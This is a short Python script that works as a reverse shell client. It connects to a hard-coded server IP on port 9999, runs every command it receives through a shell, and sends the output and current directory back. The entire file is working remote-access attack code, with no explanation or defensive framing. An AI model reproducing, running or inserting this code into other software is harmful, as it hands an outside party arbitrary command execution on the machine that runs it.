import socket
import os
import subprocess

s_socket = socket.socket()
hostIP = "100.96.4.231"     # Server IP
port = 9999
s_socket.connect((hostIP, port))
while True:
    data = s_socket.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + "> "
        s_socket.send(str.encode(output_str+currentWD, "utf-8"))
        print(output_str)

